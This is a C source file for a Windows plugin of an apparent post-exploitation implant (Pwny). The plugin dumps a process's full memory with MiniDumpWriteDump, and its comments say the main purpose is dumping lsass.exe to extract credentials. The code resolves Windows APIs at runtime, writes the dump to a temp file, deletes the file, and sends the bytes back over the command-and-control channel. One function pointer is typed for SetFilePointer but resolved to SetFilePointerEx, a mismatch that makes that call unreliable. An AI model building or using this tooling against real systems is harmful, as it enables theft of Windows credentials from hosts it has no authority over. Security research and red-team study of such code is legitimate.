/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Minidump COT plugin — create process memory dumps via MiniDumpWriteDump.
 *
 * Primarily used for dumping lsass.exe for credential extraction,
 * but works for any process with sufficient access rights.
 *
 * Supports two modes:
 *   1. Dump to a file on the target (specify remote path)
 *   2. Dump to memory and return via TLV (for smaller dumps)
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

#define MINIDUMP_CREATE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

/* TLV types */
#define TLV_TYPE_MD_PID     TLV_TYPE_CUSTOM(TLV_TYPE_INT,    TAB_BASE, API_TYPE)
#define TLV_TYPE_MD_PATH    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_MD_DATA    TLV_TYPE_CUSTOM(TLV_TYPE_BYTES,  TAB_BASE, API_TYPE)
#define TLV_TYPE_MD_SIZE    TLV_TYPE_CUSTOM(TLV_TYPE_INT,    TAB_BASE, API_TYPE + 1)

/* MiniDumpWriteDump flag */
#define MINIDUMP_TYPE_FULL 0x00000002 /* MiniDumpWithFullMemory */

/* ------------------------------------------------------------------ */
/* Win32 function pointer types                                        */
/* ------------------------------------------------------------------ */

typedef BOOL   (WINAPI *fn_MiniDumpWriteDump)(HANDLE hProcess, DWORD pid,
                                               HANDLE hFile, DWORD DumpType,
                                               PVOID ExInfo, PVOID UInfo,
                                               PVOID CbInfo);
typedef HANDLE (WINAPI *fn_OpenProcess)(DWORD, BOOL, DWORD);
typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD,
                                         LPSECURITY_ATTRIBUTES,
                                         DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
typedef DWORD  (WINAPI *fn_GetFileSize)(HANDLE, LPDWORD);
typedef BOOL   (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_DeleteFileA)(LPCSTR);
typedef BOOL   (WINAPI *fn_SetFilePointer)(HANDLE, LONG, PLONG, DWORD);
typedef DWORD  (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);

static struct
{
    fn_MiniDumpWriteDump pMiniDumpWriteDump;
    fn_OpenProcess       pOpenProcess;
    fn_CreateFileA       pCreateFileA;
    fn_CloseHandle       pCloseHandle;
    fn_GetFileSize       pGetFileSize;
    fn_ReadFile          pReadFile;
    fn_DeleteFileA       pDeleteFileA;
    fn_SetFilePointer    pSetFilePointer;
    fn_GetTempPathA      pGetTempPathA;
} w;

/* ------------------------------------------------------------------ */
/* Minidump create handler                                             */
/*                                                                     */
/* If TLV_TYPE_MD_PATH is present, dump to that file path.             */
/* Otherwise, dump to a temp file and return contents via TLV.         */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *minidump_create(c2_t *c2)
{
    int pid;
    char path[MAX_PATH];
    int has_path;
    char temp_path[MAX_PATH];
    HANDLE hProcess;
    HANDLE hFile;
    BOOL ok;
    tlv_pkt_t *result;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_MD_PID, &pid) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    has_path = (tlv_pkt_get_string(c2->request, TLV_TYPE_MD_PATH, path) >= 0);

    /* If no path, create a temp file */
    if (!has_path)
    {
        DWORD tlen;
        static DWORD counter = 0;

        tlen = w.pGetTempPathA(sizeof(temp_path) - 32, temp_path);
        if (tlen == 0)
        {
            return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        }

        /* Append a filename */
        {
            int i = (int)tlen;
            const char *suffix = "tmp_";
            while (*suffix) temp_path[i++] = *suffix++;

            /* Simple numeric suffix */
            {
                DWORD c = ++counter;
                char num[16];
                int ni = 0;
                do {
                    num[ni++] = '0' + (c % 10);
                    c /= 10;
                } while (c > 0);
                while (ni > 0) temp_path[i++] = num[--ni];
            }

            temp_path[i++] = '.';
            temp_path[i++] = 'd';
            temp_path[i++] = 'm';
            temp_path[i++] = 'p';
            temp_path[i] = '\0';
        }

        memcpy(path, temp_path, sizeof(path));
    }

    /* Open the target process */
    hProcess = w.pOpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, (DWORD)pid);
    if (hProcess == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Create the dump file */
    hFile = w.pCreateFileA(path, GENERIC_WRITE | GENERIC_READ, 0,
                            NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        w.pCloseHandle(hProcess);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Perform the dump */
    ok = w.pMiniDumpWriteDump(hProcess, (DWORD)pid, hFile,
                               MINIDUMP_TYPE_FULL, NULL, NULL, NULL);

    w.pCloseHandle(hProcess);

    if (!ok)
    {
        w.pCloseHandle(hFile);
        if (!has_path) w.pDeleteFileA(path);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (has_path)
    {
        /* Dumped to specified file — just report size */
        DWORD fsize = w.pGetFileSize(hFile, NULL);
        w.pCloseHandle(hFile);

        result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        tlv_pkt_add_u32(result, TLV_TYPE_MD_SIZE, (int)fsize);
        return result;
    }

    /* Read the temp file and return contents */
    {
        DWORD fsize = w.pGetFileSize(hFile, NULL);
        DWORD bytes_read = 0;
        unsigned char *buf;

        /* Seek back to beginning */
        w.pSetFilePointer(hFile, 0, NULL, FILE_BEGIN);

        buf = (unsigned char *)malloc(fsize);
        if (buf == NULL)
        {
            w.pCloseHandle(hFile);
            w.pDeleteFileA(path);
            return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        }

        w.pReadFile(hFile, buf, fsize, &bytes_read, NULL);
        w.pCloseHandle(hFile);
        w.pDeleteFileA(path);

        result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        tlv_pkt_add_bytes(result, TLV_TYPE_MD_DATA, buf, bytes_read);
        tlv_pkt_add_u32(result, TLV_TYPE_MD_SIZE, (int)bytes_read);

        free(buf);
        return result;
    }
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    w.pMiniDumpWriteDump = (fn_MiniDumpWriteDump)cot_resolve("dbghelp.dll",
                                                              "MiniDumpWriteDump");
    w.pOpenProcess       = (fn_OpenProcess)cot_resolve("kernel32.dll",
                                                        "OpenProcess");
    w.pCreateFileA       = (fn_CreateFileA)cot_resolve("kernel32.dll",
                                                        "CreateFileA");
    w.pCloseHandle       = (fn_CloseHandle)cot_resolve("kernel32.dll",
                                                        "CloseHandle");
    w.pGetFileSize       = (fn_GetFileSize)cot_resolve("kernel32.dll",
                                                        "GetFileSize");
    w.pReadFile          = (fn_ReadFile)cot_resolve("kernel32.dll",
                                                     "ReadFile");
    w.pDeleteFileA       = (fn_DeleteFileA)cot_resolve("kernel32.dll",
                                                        "DeleteFileA");
    w.pSetFilePointer    = (fn_SetFilePointer)cot_resolve("kernel32.dll",
                                                            "SetFilePointerEx");
    w.pGetTempPathA      = (fn_GetTempPathA)cot_resolve("kernel32.dll",
                                                          "GetTempPathA");

    api_call_register(api_calls, MINIDUMP_CREATE, (api_t)minidump_create);
}

#endif
